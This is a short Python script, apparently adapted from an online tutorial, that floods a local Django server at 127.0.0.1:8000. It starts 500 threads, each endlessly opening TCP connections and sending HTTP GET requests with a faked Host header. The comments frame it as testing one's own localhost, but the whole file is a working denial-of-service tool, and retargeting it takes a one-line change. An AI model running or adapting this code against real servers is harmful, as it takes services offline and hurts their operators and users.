# This script is intended to overload the localhost server django project
# code is from https://www.neuralnine.com/code-a-ddos-script-in-python/
import socket
import threading

target = '127.0.0.1' # the ip for the target
fake_ip = '182.21.20.32'
port = 8000 # the port the target runs on


attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(attack_num)

        s.close()


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()